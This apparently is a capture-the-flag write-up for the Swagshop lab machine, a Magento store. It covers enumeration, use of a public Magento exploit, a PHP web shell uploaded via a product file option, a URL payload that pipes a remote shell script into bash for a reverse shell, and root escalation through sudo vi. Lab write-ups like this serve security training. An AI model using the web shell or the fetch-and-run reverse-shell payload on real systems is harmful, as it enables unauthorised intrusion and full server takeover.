---
layout: default
---

# Swagshop

# Enumeration

IP → 10.10.10.140

Port scan reported the following opened ports.

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

### Port 80

In the HTTP headers we find a  domain name.

```bash
┌──(kali㉿kali)-[~/machines/linux/swagshop]
└─$ curl -I 10.10.10.140                                                                                                       
HTTP/1.1 302 Found
Date: Sun, 19 Nov 2023 10:55:00 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://swagshop.htb/
Content-Type: text/html; charset=UTF-8
```

```bash
┌──(kali㉿kali)-[~/machines/linux/swagshop]
└─$ whatweb 10.10.10.140                            
http://10.10.10.140 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
http://swagshop.htb/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
```

Since we have a domain we can perform a **subdomain enumeration**.

In the page we can many possible attacks:

- Attacking the cookies
- Attacking the products ID.
- Search an exploit for magento CMS

Directory enumeration:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -r -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.10.10.140
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 200) [Size: 1698]
/media                (Status: 200) [Size: 1917]
/includes             (Status: 200) [Size: 946]
/lib                  (Status: 200) [Size: 2877]
/app                  (Status: 200) [Size: 1698]
/shell                (Status: 200) [Size: 1547]
/skin                 (Status: 200) [Size: 1331]
/var                  (Status: 200) [Size: 2097]
/errors               (Status: 200) [Size: 2149]
/mage                 (Status: 200) [Size: 1319]
/server-status        (Status: 403) [Size: 277]
```

Listing PHP files:

```bash
┌──(kali㉿kali)-[~]
└─$ wfuzz --hc 404 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://swagshop.htb/FUZZ.php                                                                        
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000002:   200        327 L    904 W      16593 Ch    "index"                                                                                                                                                                    
000000702:   200        3 L      6 W        44 Ch       "install"                                                                                                                                                                  
000001013:   200        0 L      4 W        37 Ch       "api"                                                                                                                                                                      
000002410:   200        0 L      0 W        0 Ch        "cron"
```

Since this is a CMS, in unlikely we find a vulnerability ourselves, so there must be available exploits.

```bash
┌──(kali㉿kali)-[~/machines/linux/swagshop/exploits]
└─$ searchsploit magento                
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                                              | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                                                   | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                                                                        | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                                                                  | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                                                                 | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                                            | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                                              | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                                                                                                 | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                                                                                                 | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                                                                               | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                                                    | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                                               | php/webapps/35052.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                                                                              | php/webapps/48135.php
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

The first one we will use is `Magento eCommerce - Remote Code Execution | xml/webapps/37977.py` .

Making a proper changes to the script, we will have admin access to the adminstration panel of Magento.

# Foothold

Now searching in the internet we find that there is a way to upload custom phtml files to the server. This basically means that we can execute php code in the server. The article that explains this is this one [https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/](https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/). We will do as follows:

- Modificate an existing product to have  a `Custom Option` of type `File` with `phtml` as valid extension.
- We save the changes and add this modify product to our cart, uploading our phtml file.

```bash
<?php

phpinfo();

system($_GET['cmd']); 

?>
```

- We go to this route `/media/custom_options/quote/` and find our uploaded file. The name will be a md5 hash. Upon opening the file we should see the `phpinfo` and we can execute commands with parameter `cmd` in the url.

If we send the following payload we should receive a reverse shell.

```bash
http://swagshop.htb/media/custom_options/quote/s/p/fc6cd7e927e8f628a58e13970b9ba8e6.phtml?cmd=curl%2010.10.14.11/shell.sh%20|%20bash
```

And we do.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.140] 56572
bash: cannot set terminal process group (1668): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html/media/custom_options/quote/s/p$ whoami
whoami
www-data
www-data@swagshop:/var/www/html/media/custom_options/quote/s/p$
```

# Privilege escalation

Basic enumeration lead us toknow that user ww-data can execute one sudo command.

```bash
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

To exploit this we simply execute vi

```bash
sudo -u root /usr/bin/vi /var/www/html/install.php
```

And execute `:shell` from vi CLI. That will gives us a shell as root.

```bash
root@swagshop:/var/www/html# whoami
root
root@swagshop:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```